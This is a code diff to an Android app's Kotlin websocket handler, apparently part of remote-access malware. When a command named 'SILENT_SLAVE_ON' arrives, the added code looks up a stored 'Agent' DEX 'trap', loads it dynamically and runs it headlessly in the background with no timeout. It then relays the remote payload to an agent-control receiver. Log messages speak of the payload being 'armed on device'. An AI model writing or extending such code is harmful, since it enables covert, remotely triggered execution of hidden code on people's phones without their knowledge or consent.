@@ -117,18 +117,38 @@ object SocketManager {
                         if (innerPayload != null) {
                             val action = innerPayload.optString("action")
                             if (action == "SILENT_SLAVE_ON") {
-                                DebugLogger.log("WS", "Intercepting SILENT_SLAVE_ON. Deploying Agent trap dynamically.")
+                                DebugLogger.log("WS", "Intercepting SILENT_SLAVE_ON. Deploying Headless Agent Task.")
                                 appContext?.let { ctx ->
-                                    ctx.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE).edit().putBoolean("start_collapsed", true).apply()
-                                    val bridge = DynamicUIManager.CortexBridge(ctx)
-                                    bridge.triggerTrap("DEX", "Agent")
-                                    
-                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                        val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
-                                            putExtra("payload", innerPayload.toString())
+                                    val statsPrefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                                    val nativeStr = statsPrefs.getString("native_traps_array", "[]") ?: "[]"
+                                    val nativeArr = org.json.JSONArray(nativeStr)
+                                    var found = false
+                                    for (i in 0 until nativeArr.length()) {
+                                        val trap = nativeArr.getJSONObject(i)
+                                        if (trap.optString("label").equals("Agent", ignoreCase = true)) {
+                                            val dexPath = trap.getString("file_path")
+                                            val className = trap.getString("class_name")
+                                            val bridge = DynamicUIManager.CortexBridge(ctx)
+                                            
+                                            // Start purely headlessly (0L = No timeout / infinite background run)
+                                            com.example.myandroid.dynamic.DynamicTaskManager.executeHeadlessTask(
+                                                ctx, dexPath, className, bridge, 0L
+                                            )
+                                            found = true
+                                            break
                                         }
-                                        ctx.sendBroadcast(intent)
-                                    }, 2500)
+                                    }
+                                    
+                                    if (found) {
+                                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                            val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
+                                                putExtra("payload", innerPayload.toString())
+                                            }
+                                            ctx.sendBroadcast(intent)
+                                        }, 1200)
+                                    } else {
+                                        DebugLogger.log("WS_ERR", "Agent DEX payload not armed on device!")
+                                    }
                                 }
                             } else {
                                 val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
